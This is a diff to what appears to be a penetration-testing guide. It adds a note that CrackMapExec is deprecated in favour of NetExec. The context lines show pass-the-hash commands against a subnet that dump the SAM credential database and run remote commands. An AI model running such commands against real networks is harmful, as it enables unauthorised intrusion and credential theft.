@@ -239,6 +239,12 @@ crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --sam   # Dump SAM
 crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH -x "whoami"
 ```
 
+> [!NOTE]
+> **CrackMapExec is deprecated.** The original project was archived in 2023 and
+> continues as **NetExec** (`nxc`) — a maintained drop-in replacement with the
+> same syntax (e.g. `nxc smb 192.168.1.0/24 -u Administrator -H NTLM_HASH`). The
+> `crackmapexec` commands in this guide work identically under `nxc`.
+
 ### Pass-the-Ticket (PtT)
 
 ```powershell
